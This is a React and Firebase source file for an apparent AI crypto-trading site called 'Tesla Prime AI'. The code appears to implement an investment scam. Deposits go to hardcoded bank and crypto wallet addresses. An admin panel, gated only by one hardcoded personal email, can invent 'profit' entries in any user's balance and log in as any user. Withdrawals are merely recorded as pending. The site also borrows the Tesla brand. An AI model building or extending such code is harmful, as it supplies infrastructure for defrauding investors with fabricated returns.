
import React, { useState, useEffect, useCallback } from 'react';
import { BrowserRouter as Router, Routes, Route, Navigate, useNavigate } from 'react-router-dom';
import Navbar from './components/Navbar';
import Hero from './components/Hero';
import Features from './components/Features';
import Dashboard from './components/Dashboard';
import DataFeed from './components/DataFeed';
import AdminLogin from './components/AdminLogin';
import AuthModal from './components/AuthModal';
import Loader from './components/Loader';
import DashboardStatusBar from './components/DashboardStatusBar';
import DepositModal from './components/DepositModal';
import WithdrawalModal from './components/WithdrawalModal';
import PerformanceSection from './components/PerformanceSection';
import Testimonials from './components/Testimonials';
import FAQ from './components/FAQ';
import BotShowcase from './components/BotShowcase';
import TeslaProducts from './components/TeslaProducts';
import { RiskDisclosureModal } from './components/RiskDisclosureModal';
import NotificationSystem, { Toast } from './components/NotificationSystem';
import { TradingStats, TradingSettings, Transaction, AppNotification, User } from './types';
import { auth, db } from './firebase';
import { onAuthStateChanged, signOut } from 'firebase/auth';
import { doc, getDoc, setDoc, onSnapshot, collection, query, getDocs } from 'firebase/firestore';
import { handleFirestoreError, OperationType } from './lib/firestoreError';

// Pages
import Home from './pages/Home';
import FeaturesPage from './pages/FeaturesPage';
import FeesPage from './pages/FeesPage';
import RealEstatePage from './pages/RealEstatePage';
import ResellerPage from './pages/ResellerPage';
import AboutPage from './pages/AboutPage';
import SupportPage from './pages/SupportPage';

const INITIAL_USERS_DB: User[] = [
    { id: 'USR-8821', name: 'Automated Bot', email: 'alex.vance@prime.net', balance: 145200.50, status: 'active', kyc: 'verified', linkedAccounts: 3, joinDate: '2023-11-12', lastLogin: 'Today 10:42', activeBots: 2, phoneNumber: '+1 (415) 555-0192', country: 'United States', autoTrading: true, notifications: [] },
    { id: 'USR-9942', name: 'Sarah Connor', email: 's.connor@tech.com', balance: 0.00, status: 'suspended', kyc: 'pending', linkedAccounts: 0, joinDate: '2023-12-05', lastLogin: 'Yesterday', activeBots: 0, phoneNumber: '+1 (555) 987-6543', country: 'United Kingdom', autoTrading: false, notifications: [] },
    { id: 'USR-7721', name: 'Marcus Chen', email: 'm.chen@fund.asia', balance: 85420.00, status: 'active', kyc: 'verified', linkedAccounts: 1, joinDate: '2024-01-20', lastLogin: 'Today 09:15', activeBots: 5, phoneNumber: '+65 9123 4567', country: 'Singapore', autoTrading: true, notifications: [] },
];

const INITIAL_PLATFORM_CONFIG = {
    bankName: "SILVERGATE INSTITUTIONAL",
    accountName: "TESLA PRIME CUSTODY LLC",
    accountNumber: "8829-1920-4821",
    swift: "SGBKUS33XXX",
    btcAddress: "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh",
    ethAddress: "0x71C7656EC7ab88b098defB751B7401B5f6d8976F",
    trcAddress: "TMuAwB8a5X9Y1273912838921"
};

const DEFAULT_SETTINGS: TradingSettings = {
    riskLevel: 'balanced',
    maxTradeSize: 500,
    notifications: {
        tradeExecutions: true,
        dailySummary: true,
        marketNews: true
    }
};

const App: React.FC = () => {
  const [view, setView] = useState<'landing' | 'dashboard'>('landing');
  const [dashboardPage, setDashboardPage] = useState('Dashboard');
  const [isAppInitializing, setIsAppInitializing] = useState(true);
  const [isLoading, setIsLoading] = useState(false);
  
  const [allUsers, setAllUsers] = useState<User[]>([]);
  const [currentUser, setCurrentUser] = useState<User | null>(null);
  const [platformConfig, setPlatformConfig] = useState(INITIAL_PLATFORM_CONFIG);
  const [transactions, setTransactions] = useState<Transaction[]>([]);
  const [notifications, setNotifications] = useState<AppNotification[]>([]);
  const [toasts, setToasts] = useState<Toast[]>([]); 

  const [isTradingActive, setIsTradingActive] = useState(false);
  const [isAdminOpen, setIsAdminOpen] = useState(false);
  const [isAuthOpen, setIsAuthOpen] = useState(false);
  const [isDepositModalOpen, setIsDepositModalOpen] = useState(false);
  const [isWithdrawModalOpen, setIsWithdrawModalOpen] = useState(false);
  const [isRiskModalOpen, setIsRiskModalOpen] = useState(false);
  const [tradingSettings, setTradingSettings] = useState<TradingSettings>(DEFAULT_SETTINGS);

  const [tradingStats, setTradingStats] = useState<TradingStats>({
      balance: 0,
      profit: 0,
      trades: 0,
      history: [],
  });

  // Fetch Platform Config
  useEffect(() => {
      const configRef = doc(db, 'platformConfig', 'default');
      const unsubscribe = onSnapshot(configRef, (docSnap) => {
          if (docSnap.exists()) {
              setPlatformConfig(docSnap.data() as any);
          } else {
              setDoc(configRef, INITIAL_PLATFORM_CONFIG).catch((error) => handleFirestoreError(error, OperationType.WRITE, 'platformConfig/default'));
          }
      }, (error) => handleFirestoreError(error, OperationType.GET, 'platformConfig/default'));
      return () => unsubscribe();
  }, []);

  // Fetch Transactions
  useEffect(() => {
      const q = query(collection(db, 'transactions'));
      const unsubscribe = onSnapshot(q, (querySnapshot) => {
          const txs: Transaction[] = [];
          querySnapshot.forEach((doc) => {
              txs.push(doc.data() as Transaction);
          });
          setTransactions(txs.sort((a, b) => new Date(b.date).getTime() - new Date(a.date).getTime()));
      }, (error) => handleFirestoreError(error, OperationType.LIST, 'transactions'));
      return () => unsubscribe();
  }, []);

  // Fetch User-specific data
  useEffect(() => {
      if (!currentUser) return;
      
      const settingsRef = doc(db, 'users', currentUser.id, 'tradingSettings', 'default');
      const unsubSettings = onSnapshot(settingsRef, (docSnap) => {
          if (docSnap.exists()) {
              setTradingSettings(docSnap.data() as TradingSettings);
          } else {
              setDoc(settingsRef, DEFAULT_SETTINGS).catch((error) => handleFirestoreError(error, OperationType.WRITE, `users/${currentUser.id}/tradingSettings/default`));
          }
      }, (error) => handleFirestoreError(error, OperationType.GET, `users/${currentUser.id}/tradingSettings/default`));

      const statsRef = doc(db, 'users', currentUser.id, 'tradingStats', 'default');
      const unsubStats = onSnapshot(statsRef, (docSnap) => {
          if (docSnap.exists()) {
              setTradingStats(docSnap.data() as TradingStats);
          } else {
              setDoc(statsRef, {
                  balance: currentUser.balance,
                  profit: 0,
                  trades: 0,
                  history: []
              }).catch((error) => handleFirestoreError(error, OperationType.WRITE, `users/${currentUser.id}/tradingStats/default`));
          }
      }, (error) => handleFirestoreError(error, OperationType.GET, `users/${currentUser.id}/tradingStats/default`));

      const notifsRef = collection(db, 'users', currentUser.id, 'notifications');
      const unsubNotifs = onSnapshot(notifsRef, (querySnapshot) => {
          const notifs: AppNotification[] = [];
          querySnapshot.forEach((doc) => {
              notifs.push(doc.data() as AppNotification);
          });
          setNotifications(notifs);
      }, (error) => handleFirestoreError(error, OperationType.LIST, `users/${currentUser.id}/notifications`));

      return () => {
          unsubSettings();
          unsubStats();
          unsubNotifs();
      };
  }, [currentUser?.id]);

  const updatePlatformConfig = async (newConfig: any) => {
      try {
          await setDoc(doc(db, 'platformConfig', 'default'), newConfig);
      } catch (error) {
          handleFirestoreError(error, OperationType.WRITE, 'platformConfig/default');
      }
  };

  const updateTradingSettings = async (settings: TradingSettings) => {
      if (currentUser) {
          try {
              await setDoc(doc(db, 'users', currentUser.id, 'tradingSettings', 'default'), settings);
          } catch (error) {
              handleFirestoreError(error, OperationType.WRITE, `users/${currentUser.id}/tradingSettings/default`);
          }
      }
  };

  const updateTradingStats = async (stats: TradingStats) => {
      if (currentUser) {
          try {
              await setDoc(doc(db, 'users', currentUser.id, 'tradingStats', 'default'), stats);
          } catch (error) {
              handleFirestoreError(error, OperationType.WRITE, `users/${currentUser.id}/tradingStats/default`);
          }
      }
  };

  const addTransaction = async (tx: Transaction) => {
      try {
          await setDoc(doc(db, 'transactions', tx.id), tx);
      } catch (error) {
          handleFirestoreError(error, OperationType.WRITE, `transactions/${tx.id}`);
      }
  };

  // Check for Active Session on Mount with enhanced logic
  useEffect(() => {
    const unsubscribe = onAuthStateChanged(auth, async (firebaseUser) => {
      if (firebaseUser) {
        // User is signed in
        const userDocRef = doc(db, 'users', firebaseUser.uid);
        
        // Setup real-time listener for current user
        const unsubscribeUser = onSnapshot(userDocRef, (docSnap) => {
            if (docSnap.exists()) {
                const userData = docSnap.data() as User;
                setCurrentUser(userData);
                setView('dashboard');
                setDashboardPage('Dashboard');
                setIsTradingActive(true);
            }
        }, (error) => handleFirestoreError(error, OperationType.GET, `users/${firebaseUser.uid}`));
        
        // Fetch all users for admin view
        if (firebaseUser.email === 'richie00709@gmail.com') {
            try {
                const usersQuery = query(collection(db, 'users'));
                const querySnapshot = await getDocs(usersQuery);
                const users: User[] = [];
                querySnapshot.forEach((doc) => {
                    users.push(doc.data() as User);
                });
                setAllUsers(users);
            } catch (error) {
                handleFirestoreError(error, OperationType.LIST, 'users');
            }
        }

        setIsAppInitializing(false);
        return () => unsubscribeUser();
      } else {
        // User is signed out
        setCurrentUser(null);
        setView('landing');
        setIsAppInitializing(false);
      }
    });

    return () => unsubscribe();
  }, []);

  // Sync tradingStats when currentUser changes
  useEffect(() => {
    if (currentUser) {
      setTradingStats(prev => ({
        ...prev,
        balance: currentUser.balance
      }));
    }
  }, [currentUser?.balance]);

  const handleAddNotification = useCallback(async (title: string, message: string, type: AppNotification['type'] = 'info') => {
      const newNotif: AppNotification = {
          id: Math.random().toString(36).substr(2, 9),
          title, message, time: 'Just now', type, read: false
      };
      
      if (currentUser) {
          try {
              await setDoc(doc(db, 'users', currentUser.id, 'notifications', newNotif.id), newNotif);
          } catch (error) {
              handleFirestoreError(error, OperationType.WRITE, `users/${currentUser.id}/notifications/${newNotif.id}`);
          }
      }
      
      setToasts(prev => [{ id: newNotif.id, title, message, type: type as any, timestamp: Date.now() }, ...prev].slice(0, 5));
  }, [currentUser]);

  const handleAuthSuccess = (user: User) => {
    setIsAuthOpen(false);
    setIsLoading(true);
    
    setCurrentUser(user);

    setTimeout(() => {
        setIsTradingActive(true);
        setIsLoading(false);
        setView('dashboard');
        setDashboardPage('Dashboard');
        handleAddNotification('Bot Verified', `Authorized session for ${user.name}`, 'success');
        window.scrollTo(0, 0);
    }, 1500); 
  };

  const handleLogout = async () => {
    try {
        await signOut(auth);
        setIsTradingActive(false);
        setView('landing');
        setCurrentUser(null);
    } catch (error) {
        console.error("Error signing out: ", error);
    }
  };

  const handleUpdateUserInDb = async (updatedUser: User) => {
      try {
          await setDoc(doc(db, 'users', updatedUser.id), updatedUser);
          setAllUsers(prev => prev.map(u => u.id === updatedUser.id ? updatedUser : u));
      } catch (error) {
          handleFirestoreError(error, OperationType.WRITE, `users/${updatedUser.id}`);
      }
  };

  const handleAdminAdjustment = async (userId: string, amount: number, type: 'profit' | 'loss' | 'adjustment', description: string) => {
      try {
          const userRef = doc(db, 'users', userId);
          const userSnap = await getDoc(userRef);
          
          if (userSnap.exists()) {
              const userData = userSnap.data() as User;
              const updatedUser = { ...userData, balance: userData.balance + amount };
              await setDoc(userRef, updatedUser);
              
              setAllUsers(prev => prev.map(u => u.id === userId ? updatedUser : u));
              
              const statsRef = doc(db, 'users', userId, 'tradingStats', 'default');
              const statsSnap = await getDoc(statsRef);
              
              if (statsSnap.exists()) {
                  const currentStats = statsSnap.data() as TradingStats;
                  const newStats = {
                      ...currentStats,
                      balance: updatedUser.balance,
                      history: [{ 
                        id: `AD-${Date.now().toString().slice(-4)}`, 
                        timestamp: Date.now(), 
                        amount, 
                        type: amount >= 0 ? 'profit' : 'loss' as 'profit' | 'loss', 
                        message: `SYS: ${description}` 
                      }, ...currentStats.history]
                  };
                  await setDoc(statsRef, newStats);
                  
                  if (currentUser && currentUser.id === userId) {
                      setTradingStats(newStats);
                  }
              }
          }
      } catch (error) {
          handleFirestoreError(error, OperationType.WRITE, `users/${userId}`);
      }
  };

  const handleNavigate = (page: string) => {
      setDashboardPage(page);
      window.scrollTo({ top: 0, behavior: 'smooth' });
  };

  // Prevent flash of landing page while checking session
  if (isAppInitializing) {
      return <Loader />;
  }

  return (
    <Router>
      <AppContent 
        isLoading={isLoading}
        toasts={toasts}
        setToasts={setToasts}
        view={view}
        tradingStats={tradingStats}
        currentUser={currentUser}
        isTradingActive={isTradingActive}
        dashboardPage={dashboardPage}
        tradingSettings={tradingSettings}
        notifications={notifications}
        setIsAuthOpen={setIsAuthOpen}
        handleLogout={handleLogout}
        setIsDepositModalOpen={setIsDepositModalOpen}
        setIsWithdrawModalOpen={setIsWithdrawModalOpen}
        handleNavigate={handleNavigate}
        setIsTradingActive={setIsTradingActive}
        handleAddNotification={handleAddNotification}
        transactions={transactions}
        setIsRiskModalOpen={setIsRiskModalOpen}
        isAuthOpen={isAuthOpen}
        handleAuthSuccess={handleAuthSuccess}
        setIsAdminOpen={setIsAdminOpen}
        isAdminOpen={isAdminOpen}
        allUsers={allUsers}
        handleUpdateUserInDb={handleUpdateUserInDb}
        handleAdminAdjustment={handleAdminAdjustment}
        platformConfig={platformConfig}
        isDepositModalOpen={isDepositModalOpen}
        isWithdrawModalOpen={isWithdrawModalOpen}
        isRiskModalOpen={isRiskModalOpen}
        updateTradingSettings={updateTradingSettings}
        updatePlatformConfig={updatePlatformConfig}
        addTransaction={addTransaction}
      />
    </Router>
  );
};

// Extracted AppContent to use hooks like useNavigate
const AppContent = (props: any) => {
  const {
    isLoading, toasts, setToasts, view, tradingStats, currentUser, isTradingActive,
    dashboardPage, tradingSettings, notifications,
    setIsAuthOpen, handleLogout, setIsDepositModalOpen, setIsWithdrawModalOpen, handleNavigate,
    setIsTradingActive, handleAddNotification, transactions, setIsRiskModalOpen,
    isAuthOpen, handleAuthSuccess, setIsAdminOpen, isAdminOpen, allUsers,
    handleUpdateUserInDb, handleAdminAdjustment, platformConfig,
    isDepositModalOpen, isWithdrawModalOpen, isRiskModalOpen,
    updateTradingSettings, updatePlatformConfig, addTransaction
  } = props;

  const navigate = useNavigate();

  const handleFooterLink = (path: string) => {
    navigate(path);
    window.scrollTo({ top: 0, behavior: 'smooth' });
  };

  return (
    <div className="min-h-screen bg-prime-black selection:bg-prime-cyan selection:text-black">
      {isLoading && <Loader />}
      <NotificationSystem toasts={toasts} removeToast={(id: string) => setToasts((prev: any) => prev.filter((t: any) => t.id !== id))} />
      
      <Navbar 
        isLoggedIn={view === 'dashboard'} 
        onOpenAccount={() => setIsAuthOpen(true)} 
        onLogout={handleLogout}
        balance={tradingStats.balance}
        userProfile={currentUser || undefined}
        onOpenDepositModal={() => setIsDepositModalOpen(true)}
        onOpenWithdrawModal={() => setIsWithdrawModalOpen(true)}
        activePage={dashboardPage}
        onNavigate={handleNavigate}
        settings={tradingSettings}
        onUpdateSettings={updateTradingSettings}
        recentTrades={tradingStats.history}
        notifications={notifications}
        onMarkAllRead={() => {
            notifications.forEach((n: AppNotification) => {
                if (!n.read && currentUser) {
                    setDoc(doc(db, 'users', currentUser.id, 'notifications', n.id), { ...n, read: true })
                      .catch((error) => handleFirestoreError(error, OperationType.WRITE, `users/${currentUser.id}/notifications/${n.id}`));
                }
            });
        }}
        isTradingActive={isTradingActive}
        onToggleTrading={() => setIsTradingActive((p: boolean) => !p)}
      />

      <main className={view === 'dashboard' ? 'pt-20 pb-32 lg:pb-12 relative min-h-screen' : ''}>
        {view === 'dashboard' && (
            <div className="fixed inset-0 z-0 pointer-events-none">
                <img 
                    src="https://images.unsplash.com/photo-1639322537228-f710d846310a?auto=format&fit=crop&q=80&w=2000" 
                    alt="Background" 
                    className="w-full h-full object-cover opacity-20"
                    referrerPolicy="no-referrer"
                />
                <div className="absolute inset-0 bg-gradient-to-b from-[#020408]/90 via-[#020408]/80 to-[#020408]/95 backdrop-blur-xl"></div>
            </div>
        )}
        
        {view === 'landing' ? (
            <div className="relative">
                {/* Global Landing Background */}
                <div className="fixed inset-0 z-0 pointer-events-none">
                    <img 
                        src="https://images.unsplash.com/photo-1639322537228-f710d846310a?auto=format&fit=crop&q=80&w=2000" 
                        alt="Background" 
                        className="w-full h-full object-cover opacity-20"
                        referrerPolicy="no-referrer"
                    />
                    <div className="absolute inset-0 bg-gradient-to-b from-[#020408]/90 via-[#020408]/80 to-[#020408]/95 backdrop-blur-xl"></div>
                </div>
                
                <Routes>
                  <Route path="/" element={<Home onStart={() => setIsAuthOpen(true)} />} />
                  <Route path="/features" element={<FeaturesPage />} />
                  <Route path="/fees" element={<FeesPage />} />
                  <Route path="/real-estate" element={<RealEstatePage />} />
                  <Route path="/reseller" element={<ResellerPage />} />
                  <Route path="/about" element={<AboutPage />} />
                  <Route path="/support" element={<SupportPage />} />
                  <Route path="*" element={<Navigate to="/" replace />} />
                </Routes>
            </div>
        ) : (
            <Dashboard 
                stats={tradingStats}
                userProfile={currentUser || undefined}
                settings={tradingSettings}
                onUpdateSettings={updateTradingSettings}
                onOpenDepositModal={() => setIsDepositModalOpen(true)}
                onOpenWithdrawModal={() => setIsWithdrawModalOpen(true)}
                activePage={dashboardPage}
                onNavigate={handleNavigate}
                transactions={transactions}
            />
        )}
      </main>

      {view === 'landing' && (
        <footer className="relative text-slate-400 border-t border-white/10 pt-24 pb-12 overflow-hidden bg-transparent">
          <div className="max-w-7xl mx-auto px-6 relative z-10">
            <div className="grid grid-cols-1 md:grid-cols-12 gap-16 mb-24">
                <div className="md:col-span-5 space-y-8">
                    <div className="flex items-center gap-4">
                        <div className="w-10 h-10 bg-white rounded-xl flex items-center justify-center"><svg className="w-5 h-5 text-black" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2.5C14.5 2.5 17 3 19.5 4L19 5.5C16.8 4.6 14.5 4.2 12 4.2C9.5 4.2 7.2 4.6 5 5.5L4.5 4C7 3 9.5 2.5 12 2.5ZM12 6C15 6 17.5 7 19.5 8.5L18.5 10C16.8 8.8 14.5 8 12 8C9.5 8 7.2 8.8 5.5 10L4.5 8.5C6.5 7 9 6 12 6ZM11.2 10.5H12.8V21.5H11.2V10.5Z" /></svg></div>
                        <span className="font-display font-black text-2xl text-white tracking-tight uppercase">Tesla Prime AI</span>
                    </div>
                    <p className="text-sm leading-7 text-slate-500">Real Smart Brokerage AI tools. We deploy advanced algorithmic execution systems specifically calibrated for high-frequency volatility markets.</p>
                </div>
                <div className="md:col-span-7 flex gap-12">
                    <div className="flex flex-col gap-3">
                        <h4 className="text-white font-bold text-xs uppercase tracking-widest mb-4">Navigation</h4>
                        <button onClick={() => handleFooterLink('/')} className="text-left text-xs hover:text-prime-cyan transition-colors">Home</button>
                        <button onClick={() => handleFooterLink('/features')} className="text-left text-xs hover:text-prime-cyan transition-colors">Features</button>
                        <button onClick={() => handleFooterLink('/fees')} className="text-left text-xs hover:text-prime-cyan transition-colors">Fees</button>
                        <button onClick={() => handleFooterLink('/real-estate')} className="text-left text-xs hover:text-prime-cyan transition-colors">Real Estate</button>
                        <button onClick={() => handleFooterLink('/reseller')} className="text-left text-xs hover:text-prime-cyan transition-colors">Reseller Program</button>
                        <button onClick={() => handleFooterLink('/about')} className="text-left text-xs hover:text-prime-cyan transition-colors">About</button>
                        <button onClick={() => handleFooterLink('/support')} className="text-left text-xs hover:text-prime-cyan transition-colors">Support</button>
                    </div>
                    <div className="flex flex-col gap-3">
                        <h4 className="text-white font-bold text-xs uppercase tracking-widest mb-4">Uplink</h4>
                        <button onClick={() => setIsAuthOpen(true)} className="text-left text-xs hover:text-prime-cyan transition-colors">Terminal Access</button>
                        <button onClick={() => setIsRiskModalOpen(true)} className="text-left text-xs hover:text-prime-cyan transition-colors">Risk Disclosure</button>
                    </div>
                </div>
            </div>
            <div className="border-t border-white/5 pt-10 text-[10px] text-slate-600 font-mono flex flex-col md:flex-row justify-between">
                <p>© 2024 Tesla Prime AI Technologies. Institutional V4.2</p>
                <div className="flex gap-4">
                    <span>Latency: 12ms</span>
                    <span>Status: OPERATIONAL</span>
                </div>
            </div>
          </div>
        </footer>
      )}

      {view === 'dashboard' && <DashboardStatusBar activePage={dashboardPage} onNavigate={handleNavigate} />}

      <AuthModal 
        isOpen={isAuthOpen} 
        onClose={() => setIsAuthOpen(false)} 
        onSuccess={(user: User) => handleAuthSuccess(user)}
        onAdminAccess={() => { setIsAuthOpen(false); setIsAdminOpen(true); }}
      />
      
      <AdminLogin 
        isOpen={isAdminOpen} 
        onClose={() => setIsAdminOpen(false)}
        users={allUsers}
        onUpdateUser={handleUpdateUserInDb}
        onAdminAction={handleAdminAdjustment}
        onLoginAsUser={(u: any) => { setIsAdminOpen(false); handleAuthSuccess(u); }}
        platformConfig={platformConfig}
        onUpdatePlatformConfig={updatePlatformConfig}
        transactions={transactions}
        addTransaction={addTransaction}
        addUserNotification={handleAddNotification}
      />

      <DepositModal isOpen={isDepositModalOpen} onClose={() => setIsDepositModalOpen(false)} onConfirm={(amt: number) => {
          const tx: Transaction = { id: `TX-${Date.now()}`, userId: currentUser?.id || '', type: 'deposit', amount: amt, status: 'pending', date: new Date().toISOString() };
          addTransaction(tx);
          handleAddNotification('Deposit Pending', `Allocation of $${amt.toLocaleString()} received. Verification in progress.`, 'info');
          setIsDepositModalOpen(false);
      }} platformConfig={platformConfig} />

      <WithdrawalModal isOpen={isWithdrawModalOpen} onClose={() => setIsWithdrawModalOpen(false)} availableBalance={tradingStats.balance} onConfirm={(amt: number, meth: string, dest: string, note: string) => {
          const updatedUser = { ...currentUser!, balance: currentUser!.balance - amt };
          handleUpdateUserInDb(updatedUser);
          const tx: Transaction = { id: `TX-${Date.now()}`, userId: currentUser?.id || '', type: 'withdrawal', amount: amt, status: 'pending', date: new Date().toISOString(), destination: dest, note };
          addTransaction(tx);
          handleAddNotification('Withdrawal Processing', `Funds released to ${dest}. Confirmation required.`, 'info');
          setIsWithdrawModalOpen(false);
      }} />

      <RiskDisclosureModal isOpen={isRiskModalOpen} onClose={() => setIsRiskModalOpen(false)} />
    </div>
  );
};

export default App;
